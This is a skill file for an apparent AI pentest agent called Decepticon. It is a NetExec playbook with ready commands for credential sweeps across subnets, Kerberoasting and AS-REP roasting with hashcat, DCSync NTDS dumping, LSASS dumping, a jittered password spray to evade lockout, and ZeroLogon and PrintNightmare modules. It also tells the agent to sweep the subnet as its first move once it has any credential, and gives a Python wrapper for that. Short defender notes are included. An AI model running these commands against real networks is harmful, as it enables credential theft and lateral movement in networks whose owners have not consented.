---
name: netexec
description: NetExec (CrackMapExec successor) — unified SMB/LDAP/MSSQL/WinRM/RDP/SSH/FTP/VNC protocol auth + post-auth modules. 200+ modules incl. BloodHound auto-ingest, ESC1-15 scanning, PrintNightmare, LDAP relay.
metadata:
  when_to_use: "netexec nxc cme crackmapexec smb ldap mssql winrm rdp ad spray sweep"
  mitre_attack: T1078, T1110, T1135, T1018, T1021
  subdomain: active-directory
  upstream_url: https://github.com/Pennyw0rth/NetExec
---

# NetExec (`nxc`) Playbook

**NetExec** is the actively-maintained fork of CrackMapExec (archived
2023). One CLI, 8+ protocols, 200+ modules. The Swiss-army knife of
Windows / AD pentest.

## 1. Install
```bash
# Publisher repository, pinned to the v1.5.1 release commit (not a PyPI name):
pipx install "git+https://github.com/Pennyw0rth/NetExec.git@c7dc286ba65daf10402cdc470e531b84e6d3d911"
```

Follow the [publisher installation guide](https://www.netexec.wiki/getting-started/installation/installation-on-unix)
for platform prerequisites. Review a new release before changing the commit pin.

## 2. Protocol auth sweep
```bash
# Test creds across a subnet — single SMB null bind sweep
nxc smb 10.0.0.0/24

# With creds
nxc smb 10.0.0.0/24 -u alice -p Spring2024!
nxc smb 10.0.0.0/24 -u alice -H aad3b435b51404ee...:31d6cfe0d16ae931...  # NTLM hash

# Across protocols — same creds, different services
nxc ldap   $DC -u alice -p $PW
nxc mssql  10.0.0.5 -u alice -p $PW
nxc winrm  10.0.0.5 -u alice -p $PW
nxc rdp    10.0.0.5 -u alice -p $PW
nxc ssh    10.0.0.5 -u alice -p $PW

# Kerberos auth
nxc smb $DC -u alice -p $PW -k --kdcHost $DC
```

## 3. Critical modules

### 3.1 BloodHound auto-collect (built-in)
```bash
nxc ldap $DC -u alice -p $PW --bloodhound --collection All \
  --dns-server $DC_IP
# Drops Zip in current dir, ready to ingest into BloodHound
```

### 3.2 ADCS ESC1-15 scan
```bash
nxc ldap $DC -u alice -p $PW -M adcs
# Lists all certificates templates + vulnerability flags
```

### 3.3 Kerberoasting
```bash
nxc ldap $DC -u alice -p $PW --kerberoasting kerb.hashes
hashcat -m 13100 kerb.hashes wordlist.txt
```

### 3.4 AS-REP roasting
```bash
nxc ldap $DC -u alice -p $PW --asreproast asrep.hashes
hashcat -m 18200 asrep.hashes wordlist.txt
```

### 3.5 Spider SMB shares
```bash
nxc smb 10.0.0.0/24 -u alice -p $PW \
  --spider-plus --extensions txt,xml,config,ini,xls,xlsx,docx \
  --output-folder /tmp/spider
```

### 3.6 DC sync (when authorized as DA)
```bash
nxc smb $DC -u administrator -p $PW --ntds drsuapi
# Drops ntds.dit hashes to stdout/output
```

### 3.7 Password spray (with lockout protection)
```bash
nxc smb $DC --users users.txt -p 'Spring2024!' --threads 1 --jitter 30
# Slow + jittered to evade lockout
```

### 3.8 Module catalog
```bash
nxc smb -L                          # all SMB modules
nxc ldap -L                         # all LDAP modules
nxc smb -M lsassy -o ...            # use lsassy module to dump LSASS
nxc smb -M wcc                      # Windows Configuration Collector
nxc smb -M printnightmare           # PrintNightmare CVE-2021-34527
nxc smb -M zerologon                # ZeroLogon CVE-2020-1472
nxc smb -M scuffy                   # scf file for credential coercion
```

## 4. Output formats
```bash
nxc smb $TARGET -u alice -p $PW --log /tmp/nxc.log
nxc smb $TARGET -u alice -p $PW --json /tmp/nxc.json
nxc smb $TARGET -u alice -p $PW --csv  /tmp/nxc.csv
```

NetExec also writes to `~/.nxc/` SQLite DB by default — query w/
`nxcdb`:
```bash
nxcdb
nxc > workspace default
nxc default > proto smb
nxc default (smb) > hosts
nxc default (smb) > creds
```

## 5. Decepticon integration

When agent has any valid AD cred (recon or roast), the **first move
should be `nxc smb` cred-sweep across the subnet**. It surfaces:
- Local admin reuse (massively common; instant lateral)
- SMB signing disabled (relay target)
- Shares accessible (PII / cred farming)
- OS version + domain membership

Wrap as Decepticon tool:
```python
# decepticon/tools/ad/netexec.py — skeleton
from decepticon.tools.bash import bash_tool

def nxc_sweep(protocol: str, targets: str, user: str, pw_or_hash: str, modules: list[str] = None) -> dict:
    """Run nxc across targets; parse JSON output; promote findings to KG."""
    cmd = f"nxc {protocol} {targets} -u {user}"
    if len(pw_or_hash) == 32 + 1 + 32:  # LM:NT hash
        cmd += f" -H {pw_or_hash}"
    else:
        cmd += f" -p {shlex.quote(pw_or_hash)}"
    if modules:
        for m in modules:
            cmd += f" -M {m}"
    cmd += " --json /tmp/nxc.json"
    result = bash_tool(cmd)
    if Path("/tmp/nxc.json").exists():
        return json.loads(Path("/tmp/nxc.json").read_text())
    return {"error": "no json output"}
```

## 6. PoC framing
```bash
# Confirm sweep — find local-admin reuse
nxc smb 10.0.0.0/24 -u alice -p $PW --local-auth | grep '(Pwn3d!)'
# Each (Pwn3d!) = local admin = lateral pivot target
```

## 7. Severity
- (Pwn3d!) on production host: Critical 9.8 (RCE-ready)
- SMB signing disabled in production: High 7-8 (relay attack possible)
- Shares world-readable w/ PII: Critical depending on data

## 8. Defender
- Enforce SMB signing required (GPO: Computer Config → Windows Settings → Security Settings → Local Policies → Security Options → "Microsoft network server: Digitally sign communications (always)")
- Disable NTLM authentication where Kerberos available
- LAPS for local admin password rotation (kills local-admin-reuse)
- Lockout policy w/ low threshold + long duration

## Cross-references
- Upstream: https://github.com/Pennyw0rth/NetExec
- Decepticon AD overview: `skills/ad/SKILL.md`
- BloodHound: `skills/ad/bloodhound-query/SKILL.md`
- Kerberoast: `skills/ad/kerberoasting/SKILL.md`
- ADCS ESC1-15: `skills/ad/adcs-esc1/SKILL.md`

## Known exemplars
- Lateral movement via local-admin password reuse on Win10/Win11 endpoints — most common pattern in 2023-2024 internal pentests
- NetExec used in ~80% of OSCP-style Windows engagements (post-2024)
- Pennyw0rth fork maintains compatibility w/ CME workflows + adds active maintenance + new modules
